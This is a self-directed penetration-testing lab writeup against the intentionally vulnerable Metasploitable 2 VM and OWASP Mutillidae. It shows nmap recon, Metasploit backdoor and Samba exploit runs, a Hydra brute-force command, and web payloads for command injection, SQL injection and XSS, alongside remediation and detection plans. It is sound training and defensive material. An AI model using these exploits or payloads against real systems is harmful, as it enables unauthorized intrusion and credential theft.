# Home-penetration-testing-project

# Operation Paper Fortress 🏰 — Pentest Home Lab Writeup

A self-directed penetration testing project against an intentionally vulnerable target, taking a machine from black-box recon to multiple root footholds, web-application exploitation, and the beginning of a detection (blue-team) workflow. Built and executed entirely in an isolated home lab.

> ⚠️ **Rules of Engagement / Scope:** All activity described here was performed against **intentionally vulnerable training virtual machines that I own**, on a **sealed host-only network with no internet access**. This is self-directed lab and training work — it was **not** authorized testing of any production, third-party, or live system. Every tool and technique shown is standard security-education material.

---

## 🎯 Objective

Practice the full offensive workflow end to end — **recon → exploitation → web attacks → post-exploitation → detection** — and, just as importantly, understand *why* each technique works and be able to detect it as a defender. The detection phase is deliberate: my portfolio leans toward SOC/detection, so "I ran the attack **and** built the detection for it" is the story I'm building toward.

---

## 🧰 Lab Architecture

| Role | Machine | IP | Notes |
|---|---|---|---|
| Attacker | Kali Linux 2026.2 | `192.168.56.102` | All tooling; NAT adapter for internet + host-only adapter for the lab |
| Target | Metasploitable 2 | `192.168.56.101` | Intentionally vulnerable Linux; **host-only adapter only** (sealed off) |

**Network:** VirtualBox host-only network (`192.168.56.0/24`) with a DHCP server handing out `.101–.254`. The vulnerable target has **no route to the internet** — this is the core safety control of the whole project.

**Tools:** nmap, searchsploit, enum4linux, showmount, Metasploit Framework, Hydra, Netcat, John the Ripper, Burp Suite, sqlmap, gobuster, and (planned) Splunk for detection.

---

## 🗺️ Phase 1 — Reconnaissance ✅

Mapped the target's attack surface before touching anything.

```bash
nmap -sn 192.168.56.0/24              # host discovery — confirmed target at .101
nmap -sV -sC 192.168.56.101           # service + version detection
nmap --script vuln 192.168.56.101     # known-vulnerability scripts
```

**Key findings:**
- Multiple outdated services with version numbers (the #1 recon signal): **vsftpd 2.3.4**, **Samba 3.x**, **UnrealIRCd**, **Apache/Tomcat**, and more.
- `nmap --script vuln` explicitly flagged the **UnrealIRCd backdoor** (`Looks like trojaned version of unrealircd`) and **CVE-2014-0224 (OpenSSL CCS Injection)**.
- `searchsploit vsftpd 2.3.4` confirmed a public backdoor exploit exists.

**Deeper enumeration:**
```bash
enum4linux -a 192.168.56.101          # enumerated real user accounts (msfadmin, user, postgres, etc.)
showmount -e 192.168.56.101           # NFS exports
```
`showmount` returned:
```
Export list for 192.168.56.101:
/ *
```
➡️ **The entire filesystem (`/`) is shared to any host (`*`) over NFS, with no authentication** — a serious misconfiguration I later reused to exfiltrate files.

*(Screenshot: nmap service scan / vuln flags → `screenshots/nmap-scan.png`)*

---

## 💥 Phase 2 — Exploitation ✅ (3 confirmed root footholds)

I deliberately got into the same box **multiple different ways** to reinforce that there's rarely one hole. All three landed as **root**.

| # | Service | Metasploit Module | Weakness Type | Result |
|---|---|---|---|---|
| 1 | vsftpd 2.3.4 | `exploit/unix/ftp/vsftpd_234_backdoor` | Planted backdoor | ✅ Meterpreter session (root) |
| 2 | Samba (445) | `exploit/multi/samba/usermap_script` | Command injection (CVE-2007-2447) | ✅ Shell session (root) |
| 3 | UnrealIRCd (6667) | `exploit/unix/irc/unreal_ircd_3281_backdoor` | Planted backdoor | ✅ Meterpreter session (root) |
| 4 | Tomcat (8180) | `exploit/multi/http/tomcat_mgr_upload` | Default credentials | ⏳ Requires `HttpUsername/Password` + `RPORT 8180` (in progress) |

Example (foothold #1):
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf > set RHOSTS 192.168.56.101
msf > set LHOST 192.168.56.102
msf > run
[+] Backdoor has been spawned!
[*] Meterpreter session 1 opened
meterpreter > getuid   →  Server username: root
```

*(Screenshots: `screenshots/meterpreter-session.png`, `screenshots/samba-shell.png`)*

---

## 🔑 Phase 3 — Credential Attacks ⏳

Ran a brute-force attack with Hydra against the target's login services. This phase taught me more through its *failures* than its successes (see Challenges below):

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101
```
Key takeaways were around **tuning attacks for legacy targets** — modern crypto vs the target's 2008-era SSH, and throttling thread count so an old service doesn't choke. Documented fully in Challenges.

---

## 🕸️ Phase 4 — Web Application Attacks (OWASP Top 10) ✅

Target web app: **OWASP Mutillidae** (`http://192.168.56.101/mutillidae/`), security level 0.

### Command Injection ✅ (confirmed)
On the DNS Lookup tool, I injected a second OS command:
```
Input:  127.0.0.1; whoami
Output: ;; connection timed out; no servers could be reached
        www-data
```
➡️ The `www-data` line is my `whoami` executing **on the server** — I reached the operating system through a web form. Notably, this dropped me as the low-privileged `www-data` user (unlike the Metasploit shells, which were root) — a realistic starting point for privilege escalation.

### SQL Injection ✅ (vulnerability confirmed)
On the User Info page, I injected into the username field. The app's verbose error handling (itself a finding — **information disclosure**) showed my payload landing inside the live query:
```
Diagnostic: SELECT * FROM accounts WHERE username='' OR '1'='1' #' AND password=''
```
I validated the payload was **syntactically correct** by watching the error change from a *SQL syntax* error (malformed payload) to a *"table doesn't exist"* error (valid payload, empty DB). Final data extraction pending a database reset — see Challenges.

### Also demonstrated
- **XSS** — reflected/stored script execution (`<script>alert()</script>` / `<img src=x onerror=...>`).
- **Broken Access Control** — force-browsing via URL manipulation (`?page=...`) and IDOR-style ID tampering.

**Weakness pattern I noticed:** every single break-in — network *and* web — reduced to one of three root causes: **a planted bug/backdoor, injection/misplaced trust, or a misconfiguration.** That pattern recognition is the real skill.

*(Screenshots: `screenshots/command-injection.png`, `screenshots/sqli-diagnostic.png`)*

---

## 🛡️ Phase 5 — Detection / Blue Team ⏳ (next step)

Flipping to defender: every attack above left evidence in the target's logs (`/var/log/auth.log` for the Hydra brute-force, `/var/log/apache2/access.log` for the web payloads). Plan:
1. Exfiltrate the logs (via the open NFS share — reusing a Phase 1 finding).
2. Ingest into a local **Splunk** instance.
3. Build a saved alert (e.g. *10+ failed logins from one source IP*) that fires on the brute-force.
4. Map detections to **MITRE ATT&CK**.

---

## 📋 Findings & Remediation Summary

| Finding | Severity | Root Cause | Remediation |
|---|---|---|---|
| vsftpd 2.3.4 backdoor RCE | Critical | Malicious code in software version | Patch/upgrade; software supply-chain verification |
| Samba `usermap_script` RCE | Critical | User input passed to shell | Input validation; patch Samba |
| UnrealIRCd backdoor RCE | Critical | Trojaned source | Patch; verify software integrity |
| NFS root exported to `*` | High | Misconfiguration | Restrict exports to specific hosts; never share `/` |
| Web command injection | Critical | Input passed to OS command | Never pass input to a shell; use safe APIs |
| SQL injection | High | Data + code mixed in query | Parameterized queries / prepared statements |
| Verbose SQL error disclosure | Medium | Errors exposed to user | Generic error pages; log details server-side |
| Reflected/Stored XSS | High | Unencoded output | Output encoding + Content Security Policy |
| Broken access control (IDOR) | High | No server-side authz check | Enforce authorization on every request |

---

## 🎯 MITRE ATT&CK Mapping

| Activity | Tactic | Technique |
|---|---|---|
| nmap scanning | Discovery | Active Scanning (T1595) |
| vsftpd / Samba / UnrealIRCd exploits | Initial Access | Exploit Public-Facing Application (T1190) |
| Web command injection | Execution | Command & Scripting Interpreter (T1059) |
| Hydra brute-force | Credential Access | Brute Force (T1110) |

---

## 🧩 Challenges & How I Solved Them

*This is the honest part — the roadblocks I hit and how I worked through them. My VirtualBox build had renamed or relocated many settings versus the standard documentation, so a lot of this became command-line problem-solving.*

### 1. "No bootable medium found" — the VM had the wrong disk
**Problem:** Metasploitable wouldn't boot. The New VM wizard had silently created an **empty `.vdi`** instead of attaching the real Metasploitable `.vmdk`.
**How I solved it:** Checked *Settings → Storage*, saw the empty `.vdi`, and swapped it for the real disk via CLI:
```bash
VBoxManage storageattach "Metasploitable2" --storagectl "SATA" --port 0 --device 0 --type hdd --medium none
VBoxManage storageattach "Metasploitable2" --storagectl "SATA" --port 0 --device 0 --type hdd --medium "<path>/Metasploitable.vmdk"
```
**Lesson:** "No bootable medium" almost always means no OS disk is actually attached — check storage before assuming the VM is broken.

### 2. The disk file didn't exist — it was still zipped
**Problem:** `dir /s /b C:\*.vmdk` returned `File Not Found`. The `.vmdk` was still inside the downloaded `.zip`.
**How I solved it:** Extracted the archive first (a program can't boot a disk that's still compressed), then found the real path was one folder deeper than expected: `...\metasploitable-linux-2.0.0\Metasploitable2-Linux\Metasploitable.vmdk`.
**Lesson:** Always extract archives before use, and search the whole drive to find the true path.

### 3. The single most important lesson: "Which prompt am I in?"
**Problem:** This one bit me repeatedly. I kept typing commands into the wrong interface — e.g. `use exploit/...` at the `meterpreter >` prompt, or `whoami`/`cat` at the `msf >` prompt — and getting "Unknown command."
**How I solved it:** I learned to **read the prompt first** and match the command to its "room":

| Prompt | What it runs |
|---|---|
| `msf >` | Metasploit commands: `use`, `set`, `run`, `sessions` |
| `meterpreter >` | Meterpreter commands: `getuid`, `sysinfo`, `shell`, `background` |
| `$` / `#` (a shell) | Linux commands: `whoami`, `ls`, `cat` |

**Lesson:** Every command has a home. Most of my "errors" weren't broken commands — they were the right command in the wrong place. (Related: `whoami` doesn't exist in Meterpreter — its version is `getuid`.)

### 4. `LHOST` validation error → learning reverse vs bind shells
**Problem:** Exploits kept aborting with `OptionValidateError: LHOST`.
**How I solved it:** Set `LHOST` to my Kali IP (`192.168.56.102`). Then I understood *why*: Metasploit defaults to **reverse** payloads (the victim connects back to me), which need to know my address. **Bind** payloads don't. The tell is in the payload name — `reverse` needs LHOST, `bind` doesn't — and `show options` confirms what's required.
**Lesson:** Read `show options` and the payload name; don't guess what an exploit needs.

### 5. Hydra vs a 2008 target — two separate walls
**Problem A:** Brute-forcing SSH failed instantly: `kex error : no match for method mac algo`.
**Solution:** Metasploitable's SSH only speaks ancient crypto that modern Kali dropped for security reasons — they literally can't negotiate a connection. I switched to **FTP**, which doesn't have this issue.
**Problem B:** The FTP brute-force then crawled — `895 hours` remaining at 16 parallel threads.
**Solution:** The old FTP service choked under 16 connections. Counter-intuitively, **fewer threads = faster** on legacy services: `-t 4`. I also learned that throwing all 14M rockyou passwords at a known lab box is wasteful — a small **targeted** wordlist is smarter.
**Lesson:** "It won't connect" doesn't mean "it's secure" — sometimes newer tools refuse older crypto. And real password attacks are about *precision*, not brute volume.

### 6. SQL injection "worked" but returned an error — reading error *changes*
**Problem:** My SQLi payload kept erroring, first with `SQL syntax` then with `Table 'metasploit.accounts' doesn't exist`.
**How I solved it:** I realized the **change in the error told me my payload was correct** — the syntax error meant a malformed payload; the "table doesn't exist" error meant the query ran fine but Mutillidae's database simply hadn't been initialized (fix: the app's **Reset DB** button). I also fixed a subtle payload issue: MySQL's `--` comment needs a trailing space, so I switched to `#`.
**Lesson:** Don't just look for success — read *how the error changes* as you tune a payload. A different error is progress.

### 7. Port 6200 "already in use" after re-exploiting
**Problem:** Re-running the vsftpd exploit failed: `Backdoor bind listener port 6200 is already open`.
**How I solved it:** The backdoor from my earlier session was still open on the target (which hadn't rebooted). I could either `set ForceExploit true`, or connect straight to the open backdoor by hand with `nc 192.168.56.101 6200` — which is actually the *manual* version of the exploit.
**Lesson:** State persists on the target between attempts; a "failure" can just mean "you already succeeded earlier."

---

## 🎓 What I Learned

- **The three-cause lens:** every vulnerability is a bug, a misconfiguration, or misplaced trust. Naming the cause is how you reason about *any* system, not just this one.
- **Read the prompt / read the errors:** most of my friction was interface confusion and misread output — slowing down to read carefully solved more than any new command.
- **Manual before automated:** doing SQLi and the vsftpd backdoor by hand made me able to use sqlmap and Metasploit *intelligently* rather than blindly.
- **Legacy targets behave differently:** old crypto, slow services, and persistent state all required adapting my approach — a realistic taste of real-world engagements.
- **Offense informs defense:** understanding an attack deeply enough to execute it is what makes me able to detect it (Phase 5).

---

## 🚀 Next Steps

- [ ] Finish the Tomcat foothold (`tomcat/tomcat`, `RPORT 8180`)
- [ ] Complete the SQLi data dump with sqlmap after DB reset
- [ ] Convert command injection into a full reverse shell (web → shell)
- [ ] Stand up Splunk, ingest the target logs, and build a brute-force detection alert (MITRE T1110)
- [ ] Add a second vulnerable VM and practice pivoting

---

*Self-directed security lab project. All testing performed against intentionally vulnerable VMs I own, on an isolated network. — kadynfinney*
